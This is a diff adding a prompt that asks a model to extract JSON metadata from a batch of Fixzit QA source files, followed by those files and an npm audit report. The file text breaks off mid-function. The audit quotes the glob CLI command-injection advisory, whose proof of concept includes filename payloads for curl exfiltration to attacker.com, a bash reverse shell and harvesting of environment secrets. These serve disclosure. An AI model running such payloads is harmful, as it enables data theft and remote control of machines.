@@ -1,0 +1,1150 @@
+
+You are the "Fixzit Memory Builder" for category: "core".
+
+You are given a batch of source files from the Fixzit codebase, wrapped in <file> tags
+inside <batch_content>. Each <file> has a "path" attribute with the repository-relative
+file path, and its contents are wrapped in CDATA.
+
+YOUR TASK:
+1. Read ALL files in <batch_content>.
+2. For EACH file, extract architectural metadata using this schema:
+
+[
+  {
+    "file": "repo-relative/path/to/file.ext",
+    "category": "core",
+    "summary": "One-sentence technical summary of what this file does.",
+    "exports": ["ExportedFunctionOrClassName", "..."],
+    "dependencies": ["ImportedModuleOrPath", "..."]
+  }
+]
+
+RULES:
+- Return ONLY a valid JSON array.
+- NO markdown, NO backticks, NO comments, NO extra text.
+- Include an entry for every file in this batch.
+- If a file has no exports, use "exports": [].
+- If a file has no imports, use "dependencies": [].
+
+<batch_content>
+
+<file path="qa/AutoFixAgent.tsx">
+<![CDATA[
+"use client";
+
+import React, { useEffect, useMemo, useRef, useState } from "react";
+import html2canvas from "html2canvas";
+import { nanoid } from "nanoid";
+import { getDomPath } from "./domPath";
+import { hijackConsole, ConsoleRecord } from "./consoleHijack";
+import { heuristics } from "./qaPatterns";
+import { passesStrict } from "./acceptance";
+
+type QaEvent = {
+  id: string;
+  type:
+    | "click"
+    | "console"
+    | "runtime-error"
+    | "unhandled-rejection"
+    | "network-error"
+    | "gate";
+  route: string;
+  role: string;
+  orgId: string;
+  ts: number;
+  meta?: Record<string, unknown>;
+  screenshot?: string; // data URL when captured
+};
+
+const HUD_POS_KEY = "fixzit.qa.hud.pos";
+
+export function AutoFixAgent() {
+  const [active, setActive] = useState(true);
+  const [errors, setErrors] = useState<{
+    console: number;
+    network: number;
+    hydration: number;
+  }>({ console: 0, network: 0, hydration: 0 });
+  const [lastNote, setLastNote] = useState<string>("");
+  const [halted, setHalted] = useState(false);
+  const [pos, setPos] = useState<{ x: number; y: number }>(() => {
+    try {
+      return JSON.parse(localStorage.getItem(HUD_POS_KEY)!) || { x: 16, y: 16 };
+    } catch (e) {
+      // Silently use default position if localStorage unavailable or invalid JSON
+      if (process.env.NODE_ENV === "development") {
+        console.warn("Failed to restore HUD position:", e);
+      }
+      return { x: 16, y: 16 };
+    }
+  });
+
+  // Get from context or localStorage
+  const role =
+    typeof window !== "undefined"
+      ? localStorage.getItem("fixzit-role") || "Guest"
+      : "Guest";
+  const orgId =
+    typeof window !== "undefined"
+      ? localStorage.getItem("fixzit-org") || "unknown"
+      : "unknown";
+  const hudRef = useRef<HTMLDivElement>(null);
+  const eventBuffer = useRef<QaEvent[]>([]);
+  const originalFetchRef = useRef<typeof fetch | null>(null);
+
+  const sendBatch = async () => {
+    if (!eventBuffer.current.length) return;
+    const payload = eventBuffer.current.splice(0, eventBuffer.current.length);
+    try {
+      await fetch("/api/qa/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ batch: payload }),
+      });
+    } catch {
+      /* logging should never crash the app */
+    }
+  };
+
+  // ---- CLICK TRACER (capture phase) ----
+  useEffect(() => {
+    const onClick = (e: MouseEvent) => {
+      const target = e.target as Element;
+      if (!target) return;
+      const tag = (target as HTMLElement).tagName.toLowerCase();
+      const clickable =
+        tag === "button" ||
+        tag === "a" ||
+        (target as HTMLElement).onclick ||
+        target.closest('button,a,[role="button"]');
+      if (!clickable) return;
+
+      const evt: QaEvent = {
+        id: nanoid(),
+        type: "click",
+        route: window.location.pathname,
+        role,
+        orgId,
+        ts: Date.now(),
+        meta: {
+          tag,
+          text: (target as HTMLElement).innerText?.slice(0, 80) || "",
+          path: getDomPath(target),
+        },
+      };
+      eventBuffer.current.push(evt);
+      if (!halted) sendBatch();
+    };
+    document.addEventListener("click", onClick, true);
+    return () => document.removeEventListener("click", onClick, true);
+  }, [halted, role, orgId]);
+
+  // ---- CONSOLE & RUNTIME ----
+  useEffect(() => {
+    const undo = hijackConsole((rec: ConsoleRecord) => {
+      if (rec.level === "error") {
+        setErrors((s) => ({ ...s, console: s.console + 1 }));
+        bufferConsole(rec);
+        haltAndHeal(
+          "console",
+          rec.args?.[0]?.message || String(rec.args?.[0] || "console.error"),
+        );
+      }
+    });
+
+    const onError = (ev: ErrorEvent) => {
+      if (/hydration/i.test(ev.message)) {
+        setErrors((s) => ({ ...s, hydration: s.hydration + 1 }));
+      }
+      bufferRuntime("runtime-error", ev.message, ev.error?.stack);
+      haltAndHeal("runtime-error", ev.message);
+    };
+    const onRejection = (ev: PromiseRejectionEvent) => {
+      const msg = String(
+        ev.reason?.message || ev.reason || "unhandledrejection",
+      );
+      bufferRuntime("unhandled-rejection", msg, ev.reason?.stack);
+      haltAndHeal("unhandled-rejection", msg);
+    };
+
+    window.addEventListener("error", onError);
+    window.addEventListener("unhandledrejection", onRejection);
+    window.addEventListener("fixzit:errorBoundary", (e: Event) => {
+      const customEvent = e as CustomEvent<{
+        error?: { message?: string; stack?: string };
+      }>;
+      bufferRuntime(
+        "runtime-error",
+        customEvent.detail?.error?.message || "ErrorBoundary",
+        customEvent.detail?.error?.stack,
+      );
+      haltAndHeal(
+        "runtime-error",
+        customEvent.detail?.error?.message || "ErrorBoundary",
+      );
+    });
+
+    return () => {
+      undo();
+      window.removeEventListener("error", onError);
+      window.removeEventListener("unhandledrejection", onRejection);
+    };
+  }, []);
+
+  // ---- NETWORK ---- (Fixed: Prevent fetch interceptor detaching)
+  useEffect(() => {
+    // Store original fetch only if not already stored
+    if (!originalFetchRef.current) {
+      originalFetchRef.current = window.fetch.bind(window);
+    }
+
+    // Set up interceptor with reliability checks
+    const interceptedFetch = async (
+      input: RequestInfo | URL,
+      init?: RequestInit,
+    ) => {
+      try {
+        // Use the stored original fetch to avoid recursion
+        const originalFetch = originalFetchRef.current;
+        if (!originalFetch) {
+          throw new Error("Original fetch reference lost");
+        }
+
+        const res = await originalFetch(input, init);
+        // Only intercept if agent is active and response is not ok
+        if (active && !res.ok) {
+          setErrors((s) => ({ ...s, network: s.network + 1 }));
+          const url =
+            typeof input === "string" ? input : (input as Request).url;
+          bufferNetwork(url, res.status);
+          haltAndHeal("network-error", `HTTP ${res.status} on ${url}`);
+        }
+        return res;
+      } catch (err: unknown) {
+        // Only intercept if agent is active
+        if (active) {
+          const error = err as Error;
+          setErrors((s) => ({ ...s, network: s.network + 1 }));
+          const url =
+            typeof input === "string" ? input : (input as Request).url;
+          bufferNetwork(url, -1);
+          haltAndHeal(
+            "network-error",
+            `Network error on ${url}: ${String(error?.message || error)}`,
+          );
+        }
+        throw err;
+      }
+    };
+
+    window.fetch = interceptedFetch;
+
+    return () => {
+      // Only restore if we're the current interceptor
+      if (window.fetch === interceptedFetch && originalFetchRef.current) {
+        window.fetch = originalFetchRef.current;
+      }
+    };
+  }, [active]); // Depend on active state to ensure reliability
+
+  // ---- HALT–FIX–VERIFY ----
+  const haltAndHeal = async (type: QaEvent["type"], msg: string) => {
+    if (!active || halted) return;
+    setHalted(true);
+    await capture("before");
+    const { note } = await tryHeuristics(msg);
+    setLastNote(note);
+    // wait 10s (per STRICT) then capture again
+    await wait(10000);
+    await capture("after");
+    // Check gates and only then un-halt
+    const clean = passesStrict({
+      consoleErrors: errors.console,
+      networkFailures: errors.network,
+      hydrationErrors: errors.hydration,
+    });
+    bufferGate(clean);
+    await sendBatch();
+    setHalted(false);
+  };
+
+  const tryHeuristics = async (message: string) => {
+    if (process.env.NEXT_PUBLIC_QA_AUTOFIX !== "1")
+      return { note: "Auto-heal disabled" };
+    for (const h of heuristics) {
+      if (h.test({ message })) {
+        try {
+          return await h.apply();
+        } catch (e) {
+          // Heuristic failed to apply - continue to next heuristic
+          if (process.env.NODE_ENV === "development") {
+            console.warn("Heuristic application failed:", h, e);
+          }
+        }
+      }
+    }
+    return { note: "No heuristic matched; logged for follow-up." };
+  };
+
+  const capture = async (phase: "before" | "after") => {
+    try {
+      const canvas = await html2canvas(document.body, {
+        backgroundColor: null,
+        scale: 0.6,
+      });
+      const data = canvas.toDataURL("image/jpeg", 0.6);
+      eventBuffer.current.push({
+        id: nanoid(),
+        type: "gate",
+        route: window.location.pathname,
+        role,
+        orgId,
+        ts: Date.now(),
+        meta: { phase, errors },
+        screenshot: data,
+      });
+    } catch (e) {
+      // Screenshot capture failed - log but don't crash QA agent
+      if (process.env.NODE_ENV === "development") {
+        console.warn("Failed to capture screenshot:", e);
+      }
+    }
+  };
+
+  const bufferConsole = (rec: ConsoleRecord) => {
+    eventBuffer.current.push({
+      id: nanoid(),
+      type: "console",
+      route: window.location.pathname,
+      role,
+      orgId,
+      ts: Date.now(),
+      meta: rec,
+    });
+  };
+  const bufferRuntime = (
+    type: QaEvent["type"],
+    message: string,
+    stack?: string,
+  ) => {
+    eventBuffer.current.push({
+      id: nanoid(),
+      type,
+      route: window.location.pathname,
+      role,
+      orgId,
+      ts: Date.now(),
+      meta: { message, stack },
+    });
+  };
+  const bufferNetwork = (url: string, status: number) => {
+    eventBuffer.current.push({
+      id: nanoid(),
+      type: "network-error",
+      route: window.location.pathname,
+      role,
+      orgId,
+      ts: Date.now(),
+      meta: { url, status },
+    });
+  };
+  const bufferGate = (clean: boolean) => {
+    eventBuffer.current.push({
+      id: nanoid(),
+      type: "gate",
+      route: window.location.pathname,
+      role,
+      orgId,
+      ts: Date.now(),
+      meta: { clean, errors },
+    });
+  };
+
+  // ---- HUD (draggable, non-invasive) ----
+  useEffect(() => {
+    const onMove = (e: MouseEvent) => {
+      if (hudRef.current?.dataset.dragging === "1") {
+        const nx = Math.max(
+          8,
+          Math.min(window.innerWidth - 180, e.clientX - 60),
+        );
+        const ny = Math.max(
+          8,
+          Math.min(window.innerHeight - 48, e.clientY - 10),
+        );
+        setPos({ x: nx, y: ny });
+      }
+    };
+    const onUp = () => {
+      if (hudRef.current) {
+        hudRef.current.dataset.dragging = "0";
+        localStorage.setItem(HUD_POS_KEY, JSON.stringify(pos));
+      }
+    };
+    window.addEventListener("mousemove", onMove);
+    window.addEventListener("mouseup", onUp);
+    return () => {
+      window.removeEventListener("mousemove", onMove);
+      window.removeEventListener("mouseup", onUp);
+    };
+  }, [pos]);
+
+  const wait = (ms: number) => new Promise((res) => setTimeout(res, ms));
+
+  // Minimal status colors consistent with brand tokens (no layout changes).
+  const badge = useMemo(() => {
+    const bad = errors.console + errors.network + errors.hydration;
+    return bad ? "hsl(var(--warning))" : "hsl(var(--success))";
+  }, [errors]);
+
+  return (
+    <div
+      ref={hudRef}
+      style={{
+        position: "fixed",
+        left: pos.x,
+        top: pos.y,
+        zIndex: 2147483647,
+        pointerEvents: "auto",
+      }}
+      onMouseDown={(e) => {
+        if ((e.target as HTMLElement).id === "fixzit-hud")
+          hudRef.current!.dataset.dragging = "1";
+      }}
+    >
+      <div
+        id="fixzit-hud"
+        style={{
+          userSelect: "none",
+          cursor: "move",
+          fontFamily: "system-ui, sans-serif",
+          background: "hsl(var(--primary))",
+          color: "white",
+          borderRadius: 8,
+          padding: "6px 10px",
+          boxShadow: "0 2px 8px rgba(0,0,0,.2)",
+          width: 180,
+        }}
+      >
+        <div
+          style={{
+            display: "flex",
+            justifyContent: "space-between",
+            alignItems: "center",
+          }}
+        >
+          <strong>Fixzit QA</strong>
+          <span
+            style={{
+              background: badge,
+              width: 10,
+              height: 10,
+              borderRadius: "50%",
+            }}
+          />
+        </div>
+        <div style={{ fontSize: 12, opacity: 0.9, marginTop: 4 }}>
+          Role: {role} · {window.location.pathname}
+        </div>
+        <div style={{ fontSize: 12, marginTop: 6 }}>
+          CE:{errors.console} · NE:{errors.network} · HY:{errors.hydration}
+        </div>
+        {halted && (
+          <div
+            style={{ fontSize: 12, marginTop: 6, color: "hsl(var(--warning))" }}
+          >
+            HALTED: {lastNote || "diagnosing…"}
+          </div>
+        )}
+        <div style={{ display: "flex", gap: 6, marginTop: 6 }}>
+          <button
+            type="button"
+            onClick={() => setActive((a) => !a)}
+            style={btnStyle}
+          >
+            Agent: {active ? "On" : "Off"}
+          </button>
+          <button
+            type="button"
+            onClick={() => {
+              setErrors({ console: 0, network: 0, hydration: 0 });
+            }}
+            style={btnStyle}
+          >
+            Clear
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+const btnStyle: React.CSSProperties = {
+  background: "hsl(var(--primary))",
+  color: "white",
+  border: "none",
+  padding: "4px 8px",
+  borderRadius: 6,
+  fontSize: 12,
+  cursor: "pointer",
+};
+
+]]>
+</file>
+
+<file path="qa/ErrorBoundary.tsx">
+<![CDATA[
+"use client";
+import React from "react";
+
+type State = { hasError: boolean; message?: string };
+
+export class ErrorBoundary extends React.Component<
+  { children: React.ReactNode },
+  State
+> {
+  state: State = { hasError: false };
+  static getDerivedStateFromError(err: Error) {
+    return { hasError: true, message: String(err?.message || err) };
+  }
+  componentDidCatch(error: Error, info: React.ErrorInfo) {
+    // We do not change layout; we log via window event for the agent to pick up.
+    window.dispatchEvent(
+      new CustomEvent("fixzit:errorBoundary", { detail: { error, info } }),
+    );
+  }
+  render() {
+    return this.props.children;
+  }
+}
+
+]]>
+</file>
+
+<file path="qa/acceptance.ts">
+<![CDATA[
+export type GateSummary = {
+  consoleErrors: number;
+  networkFailures: number;
+  hydrationErrors: number;
+  buildErrors?: number; // supplied by server when available
+};
+export function passesStrict(summary: GateSummary) {
+  // 0 console errors, 0 network failures, 0 hydration errors as per STRICT acceptance.
+  return (
+    summary.consoleErrors === 0 &&
+    summary.networkFailures === 0 &&
+    summary.hydrationErrors === 0
+  );
+}
+
+]]>
+</file>
+
+<file path="qa/analysis/ANALYSIS_SUMMARY.md">
+<![CDATA[
+# Comprehensive Codebase Analysis Report
+
+**Date:** Wed Nov 19 09:25:00 +03 2025
+**Status:** Analysis Complete
+
+## Results Summary
+
+### 1. TypeScript Compilation
+
+❌ FAIL: 12 errors
+
+### 2. ESLint
+
+✅ PASS
+
+### 3. Build Test
+
+❌ FAIL
+
+### 4. Security Audit
+
+- Total vulnerabilities: 1
+- See: qa/analysis/npm-audit.txt for details
+
+### 5. Code Quality
+
+- Unused exports: (see unused-exports.txt)
+- Dependency check: See unused-deps.json
+
+## Detailed Reports
+
+All detailed reports are available in `qa/analysis/`:
+
+- `typescript-errors.txt` - TypeScript compilation errors
+- `eslint-output.txt` - ESLint errors and warnings
+- `npm-audit.txt` - Security vulnerabilities
+- `build-output.txt` - Build process output
+- `unused-exports.txt` - Potentially unused code
+- `unused-deps.json` - Unused dependencies
+
+## Next Steps
+
+Review each report and prioritize fixes based on:
+
+1. **Critical:** Build failures, TypeScript errors blocking compilation
+2. **High:** ESLint errors, security vulnerabilities (prod dependencies)
+3. **Medium:** ESLint warnings, unused exports
+4. **Low:** Dev dependencies vulnerabilities, minor optimizations
+
+]]>
+</file>
+
+<file path="qa/analysis/npm-audit.json">
+<![CDATA[
+Debugger listening on ws://127.0.0.1:50675/6b054fa1-02d3-4c93-a08f-96b7f99ff8dd
+For help, see: https://nodejs.org/en/docs/inspector
+Debugger attached.
+Debugger listening on ws://127.0.0.1:50684/e9ae8416-7ec0-4b7e-bf4c-d7b713ae9f40
+For help, see: https://nodejs.org/en/docs/inspector
+Debugger attached.
+{
+  "actions": [
+    {
+      "action": "review",
+      "module": "glob",
+      "resolves": [
+        {
+          "id": 1109843,
+          "path": ".>markdownlint-cli>glob",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1109843": {
+      "findings": [
+        {
+          "version": "11.0.3",
+          "paths": [
+            ". > markdownlint-cli@0.45.0 > glob@11.0.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109843,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=11.0.0 <11.1.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 11.1.0 or later",
+      "patched_versions": ">=11.1.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 0,
+      "high": 1,
+      "critical": 0
+    },
+    "dependencies": 1400,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1400
+  }
+}
+Waiting for the debugger to disconnect...
+Waiting for the debugger to disconnect...
+
+]]>
+</file>
+
+<file path="qa/analysis/unused-deps.json">
+<![CDATA[
+{}
+
+]]>
+</file>
+
+<file path="qa/config.js">
+<![CDATA[
+// 🔐 Use configurable email domain for Business.sa rebrand compatibility
+const EMAIL_DOMAIN = process.env.EMAIL_DOMAIN || "fixzit.co";
+
+// 🔒 SEC-049: Require password from environment - no hardcoded defaults
+const TEST_ADMIN_PASSWORD =
+  process.env.FIXZIT_TEST_ADMIN_PASSWORD ||
+  process.env.TEST_USER_PASSWORD ||
+  process.env.SEED_PASSWORD;
+if (!TEST_ADMIN_PASSWORD) {
+  throw new Error(
+    "❌ FIXZIT_TEST_ADMIN_PASSWORD/TEST_USER_PASSWORD/SEED_PASSWORD is required for QA tests. " +
+    "Set it before running: export FIXZIT_TEST_ADMIN_PASSWORD=yourpassword",
+  );
+}
+
+export const cfg = {
+  baseURL: process.env.NEXT_PUBLIC_APP_BASE_URL || "http://localhost:3000",
+  mongoUri: process.env.MONGODB_URI || "mongodb://127.0.0.1:27017",
+  mongoDb: process.env.MONGODB_DB || "fixzit_dev",
+  users: {
+    admin: {
+      email:
+        process.env.FIXZIT_TEST_ADMIN_EMAIL || `superadmin@${EMAIL_DOMAIN}`,
+      password: TEST_ADMIN_PASSWORD,
+    },
+  },
+  // expected brand tokens
+  brand: { primary: "#0061A8", secondary: "#00A859", accent: "#FFB400" },
+  // authoritative sidebar baseline for Admin/Super Admin
+  modules: [
+    "Dashboard",
+    "Work Orders",
+    "Properties",
+    "Finance",
+    "Human Resources",
+    "Administration",
+    "CRM",
+    "Marketplace",
+    "Support",
+    "Compliance",
+    "Reports",
+    "System",
+  ],
+};
+
+]]>
+</file>
+
+<file path="qa/consoleHijack.ts">
+<![CDATA[
+export type ConsoleRecord = {
+  level: "error" | "warn" | "info";
+  args: any[];
+  time: number;
+};
+export function hijackConsole(onRecord: (rec: ConsoleRecord) => void) {
+  const orig = { error: console.error, warn: console.warn, info: console.info };
+  const wrap =
+    (level: "error" | "warn" | "info") =>
+    (...args: any[]) => {
+      try {
+        onRecord({ level, args, time: Date.now() });
+      } catch {}
+      orig[level](...args);
+    };
+  console.error = wrap("error");
+  console.warn = wrap("warn");
+  console.info = wrap("info");
+  return () => {
+    console.error = orig.error;
+    console.warn = orig.warn;
+    console.info = orig.info;
+  };
+}
+
+]]>
+</file>
+
+<file path="qa/domPath.ts">
+<![CDATA[
+export function getDomPath(el: Element): string {
+  const stack: string[] = [];
+  let node: Element | null = el;
+  while (node && node.nodeType === 1) {
+    const id = (node as HTMLElement).id ? `#${(node as HTMLElement).id}` : "";
+    const cls = (node as HTMLElement).className
+      ? "." +
+        (node as HTMLElement).className.toString().trim().replace(/\s+/g, ".")
+      : "";
+    stack.unshift(`${node.nodeName.toLowerCase()}${id}${cls}`);
+    node = node.parentElement;
+  }
+  return stack.join(" > ");
+}
+
+]]>
+</file>
+
+<file path="qa/notifications/run-smoke.ts">
+<![CDATA[
+#!/usr/bin/env tsx
+/**
+ * Notification smoke test runner.
+ *
+ * Usage:
+ *   pnpm tsx qa/notifications/run-smoke.ts --channel email
+ *   pnpm tsx qa/notifications/run-smoke.ts --channel email --channel sms
+ *
+ * Add more --channel flags to exercise additional transports.
+ */
+
+import type {
+  NotificationChannel,
+  NotificationRecipient,
+  NotificationPayload,
+} from "@/lib/fm-notifications";
+import { buildNotification } from "@/lib/fm-notifications";
+import type { BulkNotificationResult } from "@/lib/integrations/notifications";
+import { sendBulkNotifications } from "@/lib/integrations/notifications";
+import { emitNotificationTelemetry } from "@/lib/telemetry";
+import {
+  connectToDatabase,
+  disconnectFromDatabase,
+} from "@/lib/mongodb-unified";
+import { logger } from "@/lib/logger";
+import { loadEnv } from "@/scripts/utils/load-env";
+
+type CliChannel = NotificationChannel;
+
+loadEnv();
+
+const ALL_CHANNELS: CliChannel[] = ["email", "sms", "whatsapp", "push"];
+
+const COMMON_ENV = [
+  "NOTIFICATIONS_SMOKE_USER_ID",
+  "NOTIFICATIONS_SMOKE_NAME",
+  "NOTIFICATIONS_SMOKE_EMAIL",
+  "NOTIFICATIONS_TELEMETRY_WEBHOOK",
+];
+
+const CHANNEL_ENV: Record<CliChannel, { label: string; required: string[] }> = {
+  email: {
+    label: "Email (SendGrid)",
+    required: ["SENDGRID_API_KEY", "SENDGRID_FROM_EMAIL", "SENDGRID_FROM_NAME"],
+  },
+  sms: {
+    label: "SMS (Twilio)",
+    required: [
+      "TWILIO_ACCOUNT_SID",
+      "TWILIO_AUTH_TOKEN",
+      "TWILIO_PHONE_NUMBER",
+      "NOTIFICATIONS_SMOKE_PHONE",
+    ],
+  },
+  whatsapp: {
+    label: "WhatsApp Business",
+    required: [
+      "WHATSAPP_BUSINESS_API_KEY",
+      "WHATSAPP_PHONE_NUMBER_ID",
+      "NOTIFICATIONS_SMOKE_PHONE",
+    ],
+  },
+  push: {
+    label: "Push (Firebase)",
+    required: [
+      "FIREBASE_ADMIN_PROJECT_ID",
+      "FIREBASE_ADMIN_CLIENT_EMAIL",
+      "FIREBASE_ADMIN_PRIVATE_KEY",
+    ],
+  },
+};
+
+function usage(): void {
+  console.log(`
+Notification Smoke Test
+-----------------------
+Usage:
+  pnpm tsx qa/notifications/run-smoke.ts --channel <email|sms|whatsapp|push>
+
+Add multiple --channel flags to exercise more than one transport.
+Examples:
+  pnpm tsx qa/notifications/run-smoke.ts --channel email
+  pnpm tsx qa/notifications/run-smoke.ts --channel email --channel sms
+  pnpm tsx qa/notifications/run-smoke.ts --channel all
+`);
+}
+
+function parseChannels(argv: string[]): CliChannel[] {
+  const selected = new Set<CliChannel>();
+
+  for (let i = 0; i < argv.length; i += 1) {
+    const arg = argv[i];
+
+    if (arg === "--help" || arg === "-h") {
+      usage();
+      process.exit(0);
+    }
+
+    if (arg === "--channel" || arg === "-c") {
+      const value = argv[i + 1];
+      if (!value) {
+        throw new Error("Missing value after --channel");
+      }
+      i += 1;
+      addChannel(value, selected);
+      continue;
+    }
+
+    if (arg.startsWith("--channel=")) {
+      const value = arg.split("=")[1];
+      addChannel(value, selected);
+      continue;
+    }
+
+    console.warn(`⚠️  Ignoring unrecognised argument: ${arg}`);
+  }
+
+  if (selected.size === 0) {
+    selected.add("email");
+  }
+
+  return Array.from(selected);
+}
+
+function addChannel(value: string, set: Set<CliChannel>): void {
+  if (!value) return;
+  const normalised = value.trim().toLowerCase();
+
+  if (normalised === "all") {
+    ALL_CHANNELS.forEach((channel) => set.add(channel));
+    return;
+  }
+
+  if (ALL_CHANNELS.includes(normalised as CliChannel)) {
+    set.add(normalised as CliChannel);
+    return;
+  }
+
+  throw new Error(
+    `Unknown channel "${value}". Expected one of: ${ALL_CHANNELS.join(", ")}, or "all".`,
+  );
+}
+
+function validateEnv(selectedChannels: CliChannel[]): void {
+  const missingCommon = COMMON_ENV.filter(
+    (key) => !process.env[key] || process.env[key]?.trim() === "",
+  );
+  if (missingCommon.length > 0) {
+    throw new Error(
+      `Missing common notification env vars: ${missingCommon.join(", ")}`,
+    );
+  }
+
+  const missingPerChannel: string[] = [];
+  for (const channel of selectedChannels) {
+    const required = CHANNEL_ENV[channel].required;
+    const missing = required.filter(
+      (key) => !process.env[key] || process.env[key]?.trim() === "",
+    );
+    if (missing.length > 0) {
+      missingPerChannel.push(
+        `${CHANNEL_ENV[channel].label}: ${missing.join(", ")}`,
+      );
+    }
+  }
+
+  if (missingPerChannel.length > 0) {
+    throw new Error(
+      `Missing channel-specific env vars:\n- ${missingPerChannel.join("\n- ")}`,
+    );
+  }
+}
+
+function requireEnv(name: string): string {
+  const value = process.env[name];
+  if (!value || value.trim() === "") {
+    throw new Error(
+      `Environment variable ${name} is required for this smoke test`,
+    );
+  }
+  return value;
+}
+
+function deriveStatus(
+  result: BulkNotificationResult,
+): Pick<NotificationPayload, "status" | "failureReason"> {
+  if (result.attempted === 0) {
+    return {
+      status: "failed",
+      failureReason: "No valid channels or contact info",
+    };
+  }
+
+  if (result.failed === 0) {
+    return { status: "sent", failureReason: undefined };
